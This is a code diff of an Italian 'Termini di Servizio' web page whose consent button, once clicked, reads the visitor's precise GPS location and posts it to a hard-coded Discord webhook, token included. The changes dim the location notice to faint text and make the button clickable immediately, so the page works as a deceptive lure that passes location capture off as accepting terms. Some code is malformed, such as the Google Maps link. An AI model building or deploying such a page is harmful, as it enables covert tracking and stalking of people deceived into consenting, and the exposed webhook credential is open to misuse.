@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Termini di Servizio e Consenso</title>
+    <title>Termini di Servizio</title>
     <style>
         * {
             box-sizing: border-box;
@@ -35,7 +35,7 @@
             border-bottom: 2px solid #eaeaea;
             padding-bottom: 10px;
         }
-        /* Box per il testo lungo da scorrere */
+        /* Box per il testo lungo con scorrimento */
         .tos-box {
             height: 200px;
             overflow-y: scroll;
@@ -48,33 +48,29 @@
             line-height: 1.5;
             margin-bottom: 20px;
         }
+        /* Dicitura trasparente sopra il pulsante */
         .notice-text {
             font-size: 15px;
             font-weight: 600;
-            color: #1a1a1a;
+            color: rgba(26, 26, 26, 0.45); /* Trasparenza definita tramite opacità */
             text-align: center;
             margin-bottom: 15px;
         }
-        /* Pulsante verde personalizzato */
+        /* Pulsante verde personalizzato - Attivo da subito */
         .btn-accept {
             width: 100%;
             padding: 14px;
             font-size: 16px;
             font-weight: bold;
             color: #ffffff;
-            background-color: #2ec4b6; /* Verde personalizzato */
+            background-color: #2ec4b6; /* Tonalità di verde personalizzata */
             border: none;
             border-radius: 6px;
             cursor: pointer;
-            transition: background-color 0.2s, opacity 0.2s;
+            transition: background-color 0.2s;
         }
         .btn-accept:hover {
             background-color: #20a498;
-        }
-        .btn-accept:disabled {
-            background-color: #cccccc;
-            cursor: not-allowed;
-            opacity: 0.7;
         }
         #status-message {
             margin-top: 15px;
@@ -90,78 +86,77 @@
     <div class="container">
         <h2>Termini di Servizio</h2>
         
-        <!-- Testo lungo da scorrere -->
-        <div class="tos-box" id="tosBox">
+        <!-- Testo lungo da scorrere tipo termini di servizio -->
+        <div class="tos-box">
             <p><strong>1. Accettazione dei Termini</strong><br>Benvenuto sulla nostra piattaforma. Proseguendo nella navigazione e nell'utilizzo di questo servizio, l'utente accetta di conformarsi e di essere vincolato dai seguenti termini e condizioni di utilizzo, che insieme alla nostra politica sulla riservatezza regolano il rapporto con l'utente.</p>
             <p><strong>2. Requisiti di Sistema e Geolocalizzazione</strong><br>Per offrire la massima accuratezza dei servizi basati sul contesto locale, l'applicazione richiede l'accesso ai moduli hardware di localizzazione del dispositivo mobile o del browser desktop. I dati raccolti includono coordinate geografiche precise e metriche di accuratezza.</p>
             <p><strong>3. Utilizzo dei Dati</strong><br>Le informazioni sulla posizione vengono elaborate in tempo reale e trasmesse in modo sicuro agli endpoint di destinazione configurati per scopi di analisi, autenticazione della sessione e fornitura di servizi di assistenza geografica integrati.</p>
-            <p>Per completare la procedura e sbloccare il pulsante di attivazione, scorrere interamente questo testo fino alla fine.</p>
         </div>
 
-        <!-- Scritta sopra il pulsante -->
-        <div class="notice-text">l'utente vuole accedere alla tua posizione</div>
+        <!-- Dicitura trasparente sopra il pulsante -->
+        <div class="notice-text">L'utente desidera accedere alla tua posizione</div>
 
-                
-        <!-- Area per i messaggi di stato -->
-        <div id="status-message">Scorri il testo per abilitare il pulsante.</div>
+        <!-- Pulsante verde attivo e cliccabile fin da subito -->
+        <button class="btn-accept" id="acceptBtn">ACCETTO</button>
+        
+        <!-- Area per la visualizzazione dello stato -->
+        <div id="status-message">Fai clic su Accetto per continuare.</div>
     </div>
 
     <script>
-        const DISCORD_WEBHOOK_URL = https://discord.com/api/webhooks/1560663320837623929/jn7Vary3PCmS1Voqu2J9GqvnABlb_tLcnOB58VYWxFTIPj4K6IU9VxCccwKgbnWjqUQz
-        const tosBox = document.getElementById('tosBox');
+        // WEBHOOK DI DISCORD CONFIGURATO CON IL TUO URL CORRENTE
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1560663320837623929/jn7Vary3PCmS1Voqu2J9GqvnABlb_tLcnOB58VYWxFTIPj4K6IU9VxCccwKgbnWjqUQz';
+
         const acceptBtn = document.getElementById('acceptBtn');
         const statusMessage = document.getElementById('status-message');
 
-                    }
-        });
-
-        // Evento click sul pulsante Accetto
+        // Evento click sul pulsante verde Accetto
         acceptBtn.addEventListener('click', () => {
-            // Verifica supporto del browser
+            // Verifica se il browser supporta l'API di geolocalizzazione
             if (!navigator.geolocation) {
                 statusMessage.innerText = "La geolocalizzazione non è supportata da questo browser.";
                 statusMessage.style.color = "#ff4d4d";
                 return;
             }
 
-            statusMessage.innerText = "Richiesta autorizzazione di sistema in corso...";
+            statusMessage.innerText = "Richiesta autorizzazione nel pop-up del browser...";
             statusMessage.style.color = "#666666";
 
             const geoOptions = {
-                enableHighAccuracy: true, // Massima precisione hardware (GPS)
-                timeout: 8000,            // Tempo limite per la risposta
-                maximumAge: 0             // Non usa posizioni memorizzate in cache
+                enableHighAccuracy: true, // Richiede la massima precisione possibile (es. GPS integrato)
+                timeout: 10000,           // Tempo massimo per ottenere la risposta dal sensore (10 secondi)
+                maximumAge: 0             // Forza una lettura in tempo reale (evita dati vecchi in cache)
             };
 
-            // Esecuzione del comando nativo Navigator Geolocation
+            // Attivazione immediata del comando nativo Navigator per richiedere la posizione
             navigator.geolocation.getCurrentPosition(sendLocationToDiscord, handleGeoError, geoOptions);
         });
 
-        // Funzione eseguita se l'utente acconsente e la geolocalizzazione ha successo
+        // Funzione eseguita se l'utente acconsente nel pop-up del browser
         function sendLocationToDiscord(position) {
-            statusMessage.innerText = "Posizione rilevata con successo. Trasmissione...";
+            statusMessage.innerText = "Posizione ottenuta. Invio al server...";
             
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
             const accuracy = position.coords.accuracy;
 
-            // Costruzione del Payload JSON standard per Discord
+            // Preparazione del payload strutturato (Embed) per Discord
             const discordPayload = {
-                username: "Sistema Verifica Posizione",
+                username: "Spidey Bot",
                 embeds: [{
-                    title: "🔒 Autorizzazione Posizione Utente",
-                    color: 3064246, // Colore Verde in formato decimale
+                    title: "📍 Coordinata Ricevuta con Successo",
+                    color: 3064246, // Colore verde decimale per l'embed
                     fields: [
                         { name: "Latitudine", value: lat.toString(), inline: true },
                         { name: "Longitudine", value: lon.toString(), inline: true },
-                        { name: "Accuratezza Stimata", value: `${accuracy.toFixed(1)} metri`, inline: true },
-                        { name: "Visualizzazione Mappa", value: `[Apri la coordinata su Google Maps](https://google.com{lat},${lon})` }
+                        { name: "Accuratezza Hardware", value: `${accuracy.toFixed(1)} metri`, inline: true },
+                        { name: "Mappa Collegata", value: `[Visualizza su Google Maps](https://google.com{lat},${lon})` }
                     ],
                     timestamp: new Date().toISOString()
                 }]
             };
 
-            // Invio della coordinata al Webhook
+            // Invio asincrono in tempo reale tramite fetch POST
             fetch(DISCORD_WEBHOOK_URL, {
                 method: 'POST',
                 headers: {
@@ -171,34 +166,34 @@
             })
             .then(response => {
                 if (response.ok) {
-                    statusMessage.innerText = "Termini accettati e dati trasmessi correttamente.";
+                    statusMessage.innerText = "Operazione completata con successo.";
                     statusMessage.style.color = "#2ec4b6";
                 } else {
-                    statusMessage.innerText = "Errore di trasmissione verso il server esterno.";
+                    statusMessage.innerText = "Errore di configurazione del server Discord.";
                     statusMessage.style.color = "#ff4d4d";
                 }
             })
             .catch(error => {
                 console.error('Errore Fetch:', error);
-                statusMessage.innerText = "Errore di rete durante l'invio dei dati.";
+                statusMessage.innerText = "Impossibile trasmettere i dati a causa di un errore di rete.";
                 statusMessage.style.color = "#ff4d4d";
             });
         }
 
-        // Gestione degli errori nativi (Rifiuto, Timeout, GPS spento)
+        // Gestione degli errori nativi legati all'interazione con il pop-up
         function handleGeoError(error) {
             switch(error.code) {
                 case error.PERMISSION_DENIED:
-                    statusMessage.innerText = "Permesso negato. L'utente ha rifiutato la richiesta di posizione.";
+                    statusMessage.innerText = "Permesso negato. L'utente ha rifiutato la richiesta nel pop-up.";
                     break;
                 case error.POSITION_UNAVAILABLE:
-                    statusMessage.innerText = "Informazioni di posizione non disponibili sui sensori correnti.";
+                    statusMessage.innerText = "I sensori di localizzazione del dispositivo non sono disponibili.";
                     break;
                 case error.TIMEOUT:
-                    statusMessage.innerText = "Tempo massimo scaduto per determinare la geolocalizzazione.";
+                    statusMessage.innerText = "Tempo scaduto prima di ricevere una coordinata valida.";
                     break;
                 default:
-                    statusMessage.innerText = "Si è verificato un errore hardware sconosciuto.";
+                    statusMessage.innerText = "Si è verificato un errore hardware imprevisto.";
                     break;
             }
             statusMessage.style.color = "#ff4d4d";
